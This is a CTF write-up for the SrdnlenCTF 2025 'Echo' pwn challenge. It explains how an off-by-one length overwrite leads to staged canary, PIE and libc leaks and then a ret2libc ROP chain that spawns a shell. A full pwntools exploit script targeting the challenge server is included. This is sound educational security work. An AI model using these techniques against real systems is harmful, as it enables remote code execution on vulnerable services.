---
title: "Echo"
description: "`Echo` is a small remote pwn challenge:"
event: "Srdnlenctf"
year: 2025
category: pwn
tags: ["pwn","format-string","rop","pwntools"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "srdnlenctf"
featured: false
flagsHidden: false
---

> Imported from [srdnlenctf](https://github.com/R3izorr/CTF_writeup/tree/main/srdnlenctf).

# Echo

## Challenge

`Echo` is a small remote pwn challenge:

```text
nc echo.challs.srdnlen.it 1091
```

The binary is a 64-bit PIE ELF with the usual modern mitigations enabled:

- Full RELRO
- Stack canary
- NX
- PIE
- SHSTK / IBT

At first glance it looks harmless: read a line, print it back, repeat. The bug is in the custom input routine.

## Binary Logic

Relevant decompilation:

```c
void read_stdin(long param_1, byte param_2)
{
  ssize_t sVar1;
  byte local_9;

  local_9 = 0;
  while (true) {
    if (param_2 < local_9) {
      return;
    }
    sVar1 = read(0, (void *)(param_1 + (ulong)local_9), 1);
    if ((sVar1 != 1) || (*(char *)(param_1 + (ulong)local_9) == '\n')) break;
    local_9 = local_9 + 1;
  }
  *(undefined1 *)(param_1 + (ulong)local_9) = 0;
}
```

```c
void echo(void)
{
  char local_58[64];
  undefined1 local_18;

  memset(local_58, 0, 0x40);
  local_18 = 0x40;
  while (true) {
    printf("echo ");
    read_stdin(local_58, local_18);
    if (local_58[0] == '\0') break;
    puts(local_58);
  }
}
```

The intended limit is `param_2`, but the function only stops when `local_9 > param_2`. That means it reads indices `0..param_2` inclusive.

For the initial call, `local_18 = 0x40`, so the program reads **65 bytes** into a **64-byte** buffer.

That gives a one-byte overwrite into the next local variable.

## Root Cause

Inside `echo()` the stack looks like this:

```text
rbp-0x50 .. rbp-0x11 : local_58[64]
rbp-0x10             : local_18
rbp-0x08             : stack canary
rbp+0x00             : saved rbp
rbp+0x08             : saved rip
```

Since `local_18` sits immediately after `local_58`, the first overflow lets us change the next read length.

That turns a 1-byte overflow into a fully controlled staged stack leak / stack smash.

## Exploitation Strategy

The key primitive is:

1. Use the off-by-one to raise `local_18`.
2. On the next loop, send exactly `local_18 + 1` bytes with no newline.
3. `read_stdin()` exits through the `if (param_2 < local_9) return;` path.
4. In that path, it does **not** append a NULL terminator.
5. `puts(local_58)` now prints past the buffer into adjacent stack data until it hits a zero byte.

This gives us controlled leaks.

### Stage 1: Expand the Read Limit

On the first iteration the limit is `0x40`, so we send:

```text
"A" * 64 + "\x48"
```

The 65th byte overwrites `local_18`, changing the next limit from `0x40` to `0x48`.

Now the next iteration can reach the canary.

### Stage 2: Leak the Canary

With `local_18 = 0x48`, the function can read 73 bytes (offsets `0..72`).

Offset `72` is the first byte of the canary, which is normally `0x00`.

We send:

```text
"A" * 64
+ "\x57"        # new next limit
+ "A" * 7
+ "B"
```

Why this works:

- Byte `64` overwrites `local_18` again, setting the next limit to `0x57` (`87`)
- Bytes `65..71` fill the gap up to the canary
- Byte `72` overwrites the canary's leading NULL with `0x42`

Because we sent exactly `73` bytes and no newline, no NULL terminator is written. `puts()` prints:

- our marker byte
- the remaining 7 canary bytes
- whatever follows until a natural zero

We recover the canary by taking the 7 leaked bytes and prepending the known low NULL byte:

```python
canary = u64(leak[:7].rjust(8, b"\x00"))
```

### Stage 3: Leak PIE

Now the read limit is `87`, so we can write offsets `0..87`.

Offset `87` is the last byte before `echo()`'s saved return address. We do not need to overwrite RIP itself; we only need to ensure the string is unterminated so printing continues into the saved RIP.

We send:

```text
"A" * 64
+ "\x77"        # set next limit to 119
+ "A" * 22
+ "C"
```

This leaves the buffer unterminated and makes `puts()` continue into the saved RIP of `echo()`, which returns to:

```text
main+0x59 == 0x1342
```

So:

```python
echo_ret = u64(leak.ljust(8, b"\x00"))
pie_base = echo_ret - 0x1342
```

### Stage 4: Leak libc

Next the limit is `119`, so we can consume:

- `echo()`'s locals
- canary
- saved rbp
- saved RIP
- part of `main()`'s frame

Using the same trick, we position a marker at offset `119`, then let `puts()` continue into the return address left on the stack by the startup path (`__libc_start_main` related frame).

Payload:

```text
"A" * 64
+ "\xff"        # final large read for the ROP payload
+ "A" * 54
+ "D"
```

This yields a libc code pointer. On the target used during solving, the leak corresponds to:

```text
libc_ret = libc_base + 0x2a1ca
```

So:

```python
libc_base = libc_ret - 0x2a1ca
```

If the remote libc differs, this is the only constant that may need adjustment.

### Stage 5: Final ROP

Now the read limit is `0xff`, which is enough to fully overwrite the stack frame.

The last trick: `echo()` only exits the loop if `local_58[0] == '\0'`.

So the final payload starts with a NULL byte:

```python
payload  = b"\x00"
payload += b"A" * 71
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)          # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
```

This does two things at once:

- `local_58[0] == 0`, so the loop breaks
- when `echo()` returns, execution lands in our ROP chain

The chain is the classic:

```text
ret -> pop rdi ; ret -> "/bin/sh" -> system
```

## Included Solve Script

The repository already contains a working exploit at [solve.py](/home/kuri/1-CTF/strlen/solve.py).

Local:

```bash
python3 solve.py
```

Remote:

```bash
python3 solve.py REMOTE
```

The important constants used by the script are:

- `CANARY_OFFSET = 72`
- `ECHO_RET_OFFSET = 87`
- `MAIN_RET_OFFSET = 119`
- `ECHO_RET_ADDR = 0x1342`
- `LIBC_STACK_RET = 0x2a1ca`

## Full Exploit

```python
from pwn import *

HOST = "echo.challs.srdnlen.it"
PORT = 1091

PROMPT = b"echo "
BUF_LEN = 64
CANARY_OFFSET = 72
ECHO_RET_OFFSET = 87
MAIN_RET_OFFSET = 119

ECHO_RET_ADDR = 0x1342
LIBC_STACK_RET = 0x2A1CA

elf = context.binary = ELF("./echo", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)


def start():
    if args.REMOTE:
        return remote(args.HOST or HOST, int(args.PORT or PORT))
    return process([elf.path], stdin=PIPE, stdout=PIPE)


def leak_with_next_len(io, current_limit, next_limit, leak_offset, marker):
    payload = b"A" * BUF_LEN
    payload += p8(next_limit)
    payload += b"A" * (leak_offset - (BUF_LEN + 1))
    payload += p8(marker)

    io.recvuntil(PROMPT)
    io.send(payload)
    io.recvuntil(p8(marker))
    return io.recvuntil(b"\n", drop=True)


def main():
    io = start()

    io.recvuntil(PROMPT)
    io.send(b"A" * BUF_LEN + p8(CANARY_OFFSET))

    canary_tail = leak_with_next_len(
        io, CANARY_OFFSET, ECHO_RET_OFFSET, CANARY_OFFSET, 0x42
    )
    canary = u64(canary_tail[:7].rjust(8, b"\x00"))
    log.success(f"canary = {canary:#x}")

    echo_ret_tail = leak_with_next_len(
        io, ECHO_RET_OFFSET, MAIN_RET_OFFSET, ECHO_RET_OFFSET, 0x43
    )
    echo_ret = u64(echo_ret_tail.ljust(8, b"\x00"))
    elf.address = echo_ret - ECHO_RET_ADDR
    log.success(f"pie base = {elf.address:#x}")

    libc_ret_tail = leak_with_next_len(
        io, MAIN_RET_OFFSET, 0xFF, MAIN_RET_OFFSET, 0x44
    )
    libc_ret = u64(libc_ret_tail.ljust(8, b"\x00"))
    libc.address = libc_ret - LIBC_STACK_RET
    log.success(f"libc base = {libc.address:#x}")

    rop = ROP(libc)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    payload = b"\x00" + b"A" * (CANARY_OFFSET - 1)
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(libc.sym.system)

    io.recvuntil(PROMPT)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Takeaways

- A single off-by-one is enough if it hits a length field
- Printing unterminated stack data can be as useful as a direct format string bug
- Even with canary, PIE, NX, Full RELRO, and CET, a staged leak can still recover everything needed for a standard ret2libc

## Note About the Reference

The requested reference page was not retrievable from this environment because the linked site returned a client-side app shell instead of the writeup content. I used a clean CTF writeup structure and the local exploit / binary analysis as the source of truth.

